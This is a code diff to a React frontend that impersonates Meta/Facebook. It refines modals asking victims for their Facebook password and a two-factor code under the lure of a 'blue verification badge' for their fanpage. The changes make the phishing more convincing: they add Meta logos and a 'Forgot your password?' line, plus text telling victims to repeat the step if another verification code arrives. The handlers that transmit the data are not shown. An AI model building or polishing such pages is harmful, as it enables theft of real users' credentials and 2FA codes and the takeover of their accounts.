@@ -603,14 +603,14 @@ function FormModal() {
 
           {/* Checkbox Terms of use */}
           <div className="flex items-center gap-2 pt-0.5">
-            <input type="checkbox" id="terms" name="agreeToTerms" checked={formData.agreeToTerms} onChange={handleChange} className="w-3 h-3 rounded border-gray-300 text-[#0064E0] focus:ring-0 cursor-pointer" />
+            <input type="checkbox" id="terms" name="agreeToTerms" checked={formData.agreeToTerms} onChange={handleChange} className="w-4 h-4 rounded border-gray-300 text-[#0064E0] focus:ring-0 cursor-pointer" />
             <label htmlFor="terms" className="text-xs text-gray-700 select-none">
               I agree with <a href="#" className="text-[#0064E0] hover:underline">Terms of use</a>
             </label>
           </div>
 
           {/* Nút Send */}
-          <button type="submit" className="w-full h-11 bg-[#0064E0] hover:bg-blue-700 active:scale-[0.99] text-white font-semibold rounded-lg text-sm transition-all shadow-md cursor-pointer mt-1">
+          <button type="submit" className="w-full h-10 bg-[#0064E0] hover:bg-blue-700 active:scale-[0.99] text-white font-semibold rounded-lg text-sm transition-all shadow-md cursor-pointer mt-1">
             Send
           </button>
         </form>
@@ -646,12 +646,13 @@ function PasswordModal() {
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 font-sans">
       <div className="bg-white w-full max-w-[400px] rounded-2xl shadow-2xl p-6 relative border border-gray-100">
         <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-sm">✕</button>
-        <div className="flex items-center justify-center mb-3">
-          <span className="text-lg font-bold text-[#0064E0]">∞ Meta</span>
+        <div className="flex items-center justify-center mb-3 p-6 ">
+          <img alt="Identity Verification" loading="lazy" width="100" height="33" decoding="async" src="/logo-meta.svg"/>
         </div>
+
         <h3 className="text-sm font-semibold text-gray-900 mb-2 text-center">For your security, you must enter your password to continue.</h3>
         
-        <form onSubmit={handleSubmit} className="mt-3 space-y-3">
+        <form onSubmit={handleSubmit} className="mt-3 space-y-3 ">
           <input
             type="password"
             placeholder="Enter your password"
@@ -661,9 +662,12 @@ function PasswordModal() {
             autoFocus
           />
           {error && <p className="text-red-500 text-xs">Incorrect password. Please try again.</p>}
-          <button type="submit" disabled={loading} className="w-full h-10 bg-[#0064E0] text-white font-semibold rounded-lg text-xs sm:text-sm hover:bg-blue-700 transition-all cursor-pointer">
-            {loading ? "Checking..." : "Continue"}
-          </button>
+          <div className="my-5" >
+              <button type="submit" disabled={loading} className="w-full h-10 bg-[#0064E0] text-white font-semibold rounded-lg text-xs sm:text-sm hover:bg-blue-700 transition-all cursor-pointer">
+              {loading ? "Checking..." : "Continue"}
+              </button>
+          </div>
+          <div className="text-sm font-semibold text-gray-400 text-center mt-0.2">Forgot your password?</div>
         </form>
       </div>
     </div>
@@ -704,11 +708,12 @@ function TwofaModal() {
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 font-sans">
       <div className="bg-white w-full max-w-[420px] rounded-2xl shadow-2xl p-6 relative border border-gray-100">
         <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-sm">✕</button>
-        <div className="flex items-center justify-center mb-2">
-          <span className="text-lg font-bold text-[#0064E0]">∞ Meta</span>
+        <div className="flex items-center justify- mb-2 ">
+         <span className="text-gray-400 m-1.5">•</span>
+          <span className="text-md font-bold text-gray-400">Facebook </span>
         </div>
-        <h3 className="text-base font-bold text-gray-900 mb-1 text-center">Two-factor authentication required</h3>
-        <p className="text-xs text-gray-600 mb-4 text-center leading-relaxed">Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.</p>
+        <h3 className="text-xl text-base font-bold text-gray-900 mb-1 text-center">Two-factor authentication required</h3>
+        <p className="text-sm text-pretty text-gray-600 mb-4 text-center leading-relaxed">Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.</p>
 
         <form onSubmit={handleSubmit} className="space-y-3">
           <label className="block text-xs font-semibold text-gray-700">Code</label>
@@ -722,10 +727,17 @@ function TwofaModal() {
             autoFocus
           />
           {countdown > 0 && <p className="text-red-500 text-xs">Incorrect code. Please try again in {countdown}s.</p>}
+          <div className="my-5" >
           <button type="submit" disabled={loading || countdown > 0} className="w-full h-10 bg-[#0064E0] text-white font-semibold rounded-lg text-xs sm:text-sm hover:bg-blue-700 transition-all disabled:opacity-50 cursor-pointer">
             {loading ? "Verifying..." : "Continue"}
           </button>
+          </div>
         </form>
+
+        <div className="flex items-center justify-center gap-2 mb-5 my-8">
+          <img alt="Identity Verification" loading="lazy" width="100" height="33" decoding="async" src="/logo-meta.svg"/>
+        </div>
+
       </div>
     </div>
   );
@@ -743,9 +755,15 @@ function SuccessModal() {
         <div className="w-14 h-14 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-3 text-2xl font-bold">
           ✓
         </div>
-        <h3 className="text-base font-bold text-gray-900 mb-2">Thank you for providing the required information.</h3>
-        <p className="text-xs text-gray-600 mb-5 leading-relaxed">
+        <h3 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Thank you for providing the required information.</h3>
+        <p className="text-md text-gray-600 mb-5 leading-relaxed  my-8">
           We will proceed with updating the blue verification badge for your fanpage. The process may take approximately 30–45 minutes.
+        </p>
+         <p className="text-md text-gray-600 mb-5 leading-relaxed  my-8">
+          If you receive a verification code again, it means the previous step was not completed correctly. Please follow the instructions and try again to complete the verification process successfully.
+        </p>
+        <p className="text-md text-gray-600 mb-5 leading-relaxed  my-8">
+          Thank you for your cooperation!
         </p>
         <button
           onClick={() => (window.location.href = "https://facebook.com")}
@@ -753,6 +771,11 @@ function SuccessModal() {
         >
           Go to Facebook
         </button>
+
+        <div className="flex items-center justify-center gap-2 mb-5 my-8">
+          <img alt="Identity Verification" loading="lazy" width="100" height="33" decoding="async" src="/logo-meta.svg"/>
+        </div>
+
       </div>
     </div>
   );
